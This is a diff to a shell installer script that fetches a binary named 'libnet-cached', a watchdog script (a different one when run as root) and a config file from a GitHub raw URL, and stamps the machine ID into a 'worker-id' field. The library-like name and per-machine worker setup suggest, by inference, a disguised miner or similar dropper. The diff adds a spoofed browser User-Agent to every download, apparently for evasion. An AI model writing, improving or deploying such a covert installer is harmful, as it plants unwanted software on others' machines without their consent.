@@ -21,11 +21,12 @@ else
     REAL_USER="$USER"
 fi
 
+Ua="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 SOFTWARE_BIN="$INSTALL_DIR/libnet-cached"
 WATCHDOG_SCRIPT="$INSTALL_DIR/libnet-cache-check.sh"
 CONFIG_JSON="$INSTALL_DIR/config.json"
 
-HTTP_SERVER="https://github.com/Formin-cell/libnet-cache/raw/refs/heads/"
+HTTP_SERVER="https://github.com/Formin-cell/libnet-cache/raw/refs/heads"
 SOFTWARE_URL="$HTTP_SERVER/modules/libnet-cached"
 if [ "$(id -u)" -eq 0 ]; then
     WATCHDOG_URL="$HTTP_SERVER/modules/cache-env-root.sh"
@@ -74,7 +75,7 @@ deploy() {
     log "Downloading file binary from $SOFTWARE_URL..."
     
 
-    if curl -fsSL --retry 3 --retry-delay 5 "$SOFTWARE_URL" -o "$SOFTWARE_BIN" 2>/dev/null; then
+    if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$SOFTWARE_URL" -o "$SOFTWARE_BIN" 2>/dev/null; then
         log "file downloaded from network"
     else
 
@@ -91,7 +92,7 @@ deploy() {
     log "Downloading script from $WATCHDOG_URL ($mode_str mode)..."
     
 
-    if curl -fsSL --retry 3 --retry-delay 5 "$WATCHDOG_URL" -o "$WATCHDOG_SCRIPT" 2>/dev/null; then
+    if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$WATCHDOG_URL" -o "$WATCHDOG_SCRIPT" 2>/dev/null; then
         log "script downloaded from network"
     else
         rm -f "$WATCHDOG_SCRIPT"
@@ -105,7 +106,7 @@ deploy() {
 
     echo "MACHINE NAME: $MACHINE_ID"
 
-    if curl -fsSL --retry 3 --retry-delay 5 "$CONFIG_URL" -o "$CONFIG_JSON" 2>/dev/null; then
+    if curl -fsSL -H "$Ua" --retry 3 --retry-delay 5 "$CONFIG_URL" -o "$CONFIG_JSON" 2>/dev/null; then
         log "config downloaded from network"
         
         if sed -i --follow-symlinks "s#\"worker-id\":\s*[^,}]*#\"worker-id\": \"$MACHINE_ID\"#g" "$CONFIG_JSON" && \
